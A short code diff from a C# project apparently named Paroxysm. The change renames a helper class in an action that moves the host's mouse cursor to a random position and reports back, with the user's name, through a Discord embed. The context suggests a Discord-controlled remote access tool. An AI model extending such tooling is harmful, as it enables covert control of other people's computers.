@@ -1,5 +1,5 @@
 ﻿using Discord;
-using Paroxysm.Tools;
+using Paroxysm.Discord;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -14,7 +14,7 @@ public static class MoveCursorAction
 
         HookStatement.SetCursorPos(randomX, randomY);
 
-        return EmbedCreator.CreateWithText(Color.Red, "Command was successfully executed.",
+        return DiscordEmbed.CreateWithText(Color.Red, "Command was successfully executed.",
             "Mouse cursor has been moved", Environment.UserName,
             null);
     }
